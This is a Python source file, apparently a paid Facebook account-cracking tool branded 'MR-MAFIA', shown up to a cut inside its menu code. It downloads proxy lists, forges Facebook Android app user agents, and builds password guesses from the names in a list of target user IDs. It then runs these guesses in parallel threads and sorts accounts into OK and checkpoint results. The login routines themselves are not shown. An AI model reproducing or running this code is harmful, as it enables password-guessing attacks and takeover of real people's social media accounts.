# Owner mr-mafia / Facebook Youcef YT
import os,requests,json,time,re,random,sys,uuid,string,subprocess,zlib,platform
import marshal
import os,httpx
import os,base64
from os import system as clr
print('\033[1;32m[\033[1;31m-\033[1;32m] \033[1;32m install modules...\n It will take some seconds...')
os.system('pip install httplib2')
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess,platform
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred 
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python MAFIA.py')

#------------------[ PROXY SERVER ]-------------------#
proxylist = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
open('socksku.txt', 'w').write(proxylist)
proxsi = open('socksku.txt', 'r').read().splitlines()

os.system('rm -rf prox.txt')  
try:
    prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
    open('prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('prox.txt','r').read().splitlines()
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550    5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]

os.system('pip install httpx')
os.system('pip install requests rich')
os.system('pip install requests')
os.system('pip install mechanize')
os.system('pip install bs4 httpx')
os.system('clear')
print('             \x1b[38;5;46m WELCOME TO MAFIA WORLD          ')

#------------------[ User agent UA ]-------------------#
def UA():
    dal = "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))"
    a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
    b = ";[FBAN/Orca-Android;FBAV/130.0.0.15.89;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/67467545;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"+"[FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
    c = ";[FBAN/Orca-Android;FBAV/44.0.0.8.52;FBPN/com.facebook.orca;FBLC/en_US;FBBV/16048044;FBCR/cricket;FBMF/zte;FBBD/zte;FBDV/Z987;FBSV/4.4.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;]"+"[FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507260;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2768};FB_FW/1;]"
    d = ";[FBAN/Orca-Android;FBAV/230.0.0.12.117;FBPN/com.facebook.orca;FBLC/en_EG;FBBV/169378254;FBCR/Android;FBMF/samsung;FBBD/samsung;FBDV/SM-N9005;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1280};FB_FW/1;]"+"[FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;]"
    ua = a+b+c+d
    return ua
    
def UA1():
    dal = "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))"
    a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
    b = ";[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A310F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1812};FBLC/pt_PT;FBRV/85070460;FBCR/NOS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI VNS-L31;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua = a+b
    return ua    
def UAA():
    dal = "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))"
    a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
    b = ";[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A310F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1812};FBLC/pt_PT;FBRV/85070460;FBCR/NOS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI VNS-L31;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua = a+b
    return ua
#------------------[ COLORS ]-------------------#
gggg = '\033[8;102m'#اخضر جديدة تغطية كيمات
rrrr = '\033[8;101m'#احمر جديد تغطية كلمات
rrrrrrrr = '\033[32;101m'#احمر واخضر

# {gas} أخضر
# {green} أخضر
# {red}  احمر
# {white} أبيض
# {faltu}{red} [] 

q = '\033[1;30m'#Gray
w = '\033[1;31m'#red 
e = '\033[1;32m'#green
r = '\033[1;33m'#yellow 
t = '\033[1;34m'#blue 
y = '\033[1;35m'#rosy 
u = '\033[1;36m'#Open blue 
i = '\033[1;37m'#white 
#------------------[ COLORS ]-------------------#
P = '\x1b[1;97m' # 
M = '\033[1;33m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;96m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;97m' #
R = '\x1b[38;5;246m' #
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N, R]
ssn = requests.Session()
boos = random.choice([P,M,H,K,B,U,O,N,R])
# {boos}
orange = "\x1b[38;5;196m";yellow = "\x1b[38;5;208m";black="\033[1;30m";red="\x1b[38;5;160m";green="\x1b[38;5;46m";yelloww="\033[1;33m";blue="\033[38;5;6m";purple="\033[1;35m";cyan="\033[1;36m";white="\033[1;37m";faltu = "\033[1;47m";pvt = "\033[1;0m";gren = "\x1b[38;5;154m";gas = "\033[1;32m"
abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
my_color = [white,blue,green];warna = random.choice(my_color)

def p(x):
	print(x)
	 
logo=(f"""\033[1;37m
d8888b.           888                                 
d88P  Y88b          888                                 
Y88b.               888                                 
 "Y888b.    8888b.  888 88888b.d88b.   8888b.  88888b.  
    "Y88b.     "88b 888 888 "888 "88b     "88b 888 "88b 
      "888 .d888888 888 888  888  888 .d888888 888  888 
Y88b  d88P 888  888 888 888  888  888 888  888 888  888 
 "Y8888P"  "Y888888 888 888  888  888 "Y888888 888  888 
                                                 
\033[1;34m═════════════════════════════════════════
 {green}[{red}<\>{green}] AUTHOR  : MR-MAFIA
 {green}[{red}<\>{green}] SERVICE : {rrrrrrrr}PAID \033[;0m\033[1;93m
 {green}[{red}<\>{green}] VERSION : 4.0
\033[1;34m═════════════════════════════════════════""")
# I love you Mom 
def linex():
    print('\033[1;34m═════════════════════════════════════════')
#------------------[ system clear ]-------------------#
def clear():
        os.system('clear')
        print(logo)
#------------------[ system  ]-------------------#
loop=0
lim=0
tp=0
oks=[]
cps=[]
pcp=[]
id=[]
plist = []
methods = []
speed = []
twf = []
#------------------[ SIM CODE  ]-------------------#
try:
    output = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8')
    carrier = output.replace(',', '\033[1;37m|\033[1;37m').replace('\n', '')
except Exception as e:
    pass
    carrier = None
#------------------[ SALMAN BHAI  ]-------------------#
def menu():
                        clear()
                        print(' \033[1;32m[\033[1;31m1\033[1;32m] CRACK FILE ')
                        print(' \033[1;32m[\033[1;31m2\033[1;32m] WHATSAPP GROUP')
                        print(' \033[1;32m[\033[1;31m3\033[1;32m] FOLLOW FB')
                        print(' \033[1;32m[\033[1;31m0\033[1;32m] EXIT ')
                        linex()
                        xd=input(' \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ')
                        if xd in ['1','01']:
                                clear()
                                print(' \033[1;32m[\033[1;31m–\033[1;32m] FILE EXAMPLE : /sdcard/mafia.txt')
                                linex()
                                file = input(' \033[1;32m[\033[1;31m–\033[1;32m] ENTER FILE PATH\033[1;32m : ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' \033[1;32m[\033[1;31m–\033[1;32m] FILE LOCATION NOT FOUND ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(' \033[1;32m[\033[1;31m–\033[1;32m] TRY METHOD 1 & 3 FOR BEST RESULTS ')
                                linex()
                                print(' \033[1;32m[\033[1;31m1\033[1;32m] METHOD ')
                                print(' \033[1;32m[\033[1;31m2\033[1;32m] METHOD ')
                                print(' \033[1;32m[\033[1;31m3\033[1;32m] METHOD ')
                                #print(' \033[1;32m[\033[1;31m4\033[1;32m] METHOD ')
                                #print(' \033[1;32m[\033[1;31m5\033[1;32m] METHOD ')
                                linex()
                                mthd=input(' \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ')
                                linex()
                                plist = []
                                clear()
                                print(" \033[1;32m[\033[1;31m1\033[1;32m] AUTO PASSWORD ")                                
                                print(" \033[1;32m[\033[1;31m2\033[1;32m] MANUAL PASSWORD ") 
                                linex()
                                psx=input(' \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ')
                                if psx in ['1','01']:
                                        plist.append('first first')
                                        plist.append('first last')
                                        plist.append('last first')
                                        plist.append('last last')
                                        plist.append('firstfirst')     
                                        plist.append('firstlast')
                                        plist.append('lastfirst')
                                        plist.append('lastlast')
                                        plist.append("firstlast123")
                                        plist.append("firstlast1234")
                                        plist.append('firstlast12345')
                                        plist.append('first 123')
                                        plist.append('first 1234')
                                        plist.append('first 12345')
                                        plist.append('first12')
                                        plist.append('first123')
                                        plist.append('first1234')
                                        plist.append('first12345')
                                        plist.append('first123456')
                                        plist.append('first123456789')
                                else:
                                        try:
                                                linex()
                                                ps_limit = int(input(' \033[1;32m[\033[1;31m–\033[1;32m] HOW MANY PASSWORDS DO YOU WANT TO ADD ? '))
                                        except:
                                                ps_limit =1
                                        linex()
                                        print(' \033[1;32m[\033[1;31m–\033[1;32m] EXAMPLE : first last,firtslast,first123')
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f' \033[1;32m[\033[1;31m–\033[1;32m] PASSWORD {i+1}:\033[1;31m '))
                                      
                                clear()
                                print(' \033[1;32m[\033[1;31m–\033[1;32m] DO YOU WENT SHOW CP ACCOUNT ? [Y/N] : ')
                                linex()
                                cx=input(' \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                    pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print(" \033[1;32m[\033[1;31m–\033[1;32m] IF NO RESULT \033[1;33m[\033[1;31mON\033[1;33m/\033[1;31mOFF\033[1;33m] \033[1;32mAIRPLAN MODE ")
                                        #print(' \033[1;32m[\033[1;31m–\033[1;32m] SIM NAME   \033[1;33m: \033[1;37m'+carrier+f' ')
                                        print(' \033[1;32m[\033[1;31m–\033[1;32m] TOTAL UID  \033[1;33m: \033[1;37m'+total_ids+f' ')
                                        print(' \033[1;32m[\033[1;31m–\033[1;32m] METHOD     \033[1;33m: \033[1;37m'+mthd+f' ')                      
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(M_file_1,ids,names,passlist) 
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(M_file_2,ids,names,passlist)
                                                elif mthd in ['3','03']:
                                                        crack_submit.submit(M_file_3,ids,names,passlist)
                                                elif mthd in ['4','04']:
                                                        crack_submit.submit(M_file_4,ids,names,passlist)
                                                elif mthd in ['5','05']:
                                                        crack_submit.submit(M_file_5,ids,names,passlist)
                                                elif mthd in ['6','06']:
                                                        crack_submit.submit(M_file_6,ids,names,passlist)
                                                         
                                print('\033[1;37m')
                                linex()
                                print('\033[1;32m[\033[1;31m–\033[1;32m] The process has completed')
                                print('\033[1;32m[\033[1;31m–\033[1;32m] OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input('\033[1;32
